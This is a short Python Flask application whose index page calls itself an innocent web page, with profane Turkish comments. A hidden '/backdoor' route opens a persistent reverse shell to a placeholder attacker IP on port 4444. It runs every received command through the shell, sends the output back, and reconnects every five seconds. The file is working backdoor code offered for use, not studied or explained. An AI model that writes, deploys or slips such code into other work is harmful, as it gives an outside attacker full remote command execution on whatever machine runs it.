from flask import Flask, request
import socket
import os
import subprocess
import time

app = Flask(__name__)

@app.route('/')
def index():
    return "Merhaba, bu masum bir web sayfası!"

@app.route('/backdoor')
def backdoor():
    host = 'SENIN_IP_ADRESIN'  # Kendi IP adresini buraya yaz, kahrolası herif!
    port = 4444  # Port numarası, istediğin gibi değiştir, amına koyayım!

    while True:
        try:
            s = socket.socket()
            s.connect((host, port))

            while True:
                data = s.recv(1024)
                if data[:2].decode("utf-8") == 'cd':
                    os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        except:
            time.sleep(5)  # Bağlantı kesilirse 5 saniye bekle ve yeniden dene

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
